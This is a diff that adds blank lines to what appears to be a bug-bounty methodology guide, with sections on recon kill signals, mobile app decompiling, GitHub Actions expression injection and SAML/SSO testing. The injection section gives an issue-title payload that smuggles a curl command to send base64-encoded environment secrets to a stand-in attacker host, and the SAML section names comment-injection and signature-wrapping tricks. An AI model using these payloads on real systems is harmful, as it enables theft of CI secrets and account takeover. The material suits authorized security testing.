@@ -47,6 +47,7 @@ Check: Is it a third-party service they just use? Third-party = out of scope.
 If a target surface shows nothing interesting after 5 minutes → move on.
 
 Kill signals:
+
 - All hosts return 403 or static pages
 - No API endpoints with ID parameters
 - No JavaScript bundles with interesting paths
@@ -136,6 +137,7 @@ Always call the API as the leaked key. Enumerate permissions.
 ## 18. MOBILE = DIFFERENT ATTACK SURFACE
 
 Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
+
 - Hardcoded secrets in `strings` output that web recon never finds
 - API endpoints in decompiled source that aren't in the web JS
 - Deep-link handlers with injection points
@@ -165,14 +167,17 @@ find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request
 ```
 
 **Expression injection PoC (create an issue with this title):**
+
 ```
 test"; curl https://ATTACKER.com/$(env | base64 -w0) #
 ```
+
 If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).
 
 ## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY
 
 SAML implementations are notoriously buggy. If target uses SSO, always test:
+
 - XML signature wrapping (XSW) — valid signature, injected assertion
 - Comment injection — `admin<!---->@company.com` = sign as admin
 - XML external entity in SAML assertion
